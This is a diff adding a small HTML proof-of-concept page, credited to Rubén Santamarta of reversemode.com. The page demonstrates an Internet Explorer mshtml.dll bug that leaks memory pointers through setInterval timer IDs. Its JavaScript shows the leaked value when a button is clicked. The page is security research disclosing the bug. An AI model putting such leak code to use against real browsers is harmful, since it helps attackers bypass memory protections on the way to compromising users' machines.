@@ -1,0 +1,42 @@
+<html>
+<!--http://reversemode.com/index.php?option=com_content&task=view&id=68&Itemid=1 -->
+<!-- mshtml.dll CTimeoutEventList::InsertIntoTimeoutList Timer ID Pointer leak - Rubén Santamarta www.reversemode.com -->
+
+    <head>
+
+        
+        <title>mshtml.dll CTimeoutEventList::InsertIntoTimeoutList Timer ID Pointer leak - Rubén Santamarta www.reversemode.com</title>
+
+        <script type='text/javascript'>
+						var i = 1; // counter
+						
+            function LeakOrDie() {
+            	var t;
+							t=setInterval("foo()",2000);
+							t-=i;
+							document.getElementById('atun').innerHTML = '<b> Pointer leaked:</b> '+'0x'+t.toString(16);
+							i++;
+            }
+            
+	          function foo()
+	          {
+	          	return;
+	          }
+            
+            
+        </script>
+
+    </head>
+
+    <body>
+
+	
+	<INPUT TYPE=button VALUE="Press to leak"  ONCLICK="LeakOrDie();">
+
+	<br /><br />
+
+		<div id='atun'>		</div>
+    
+   </body>
+
+</html>
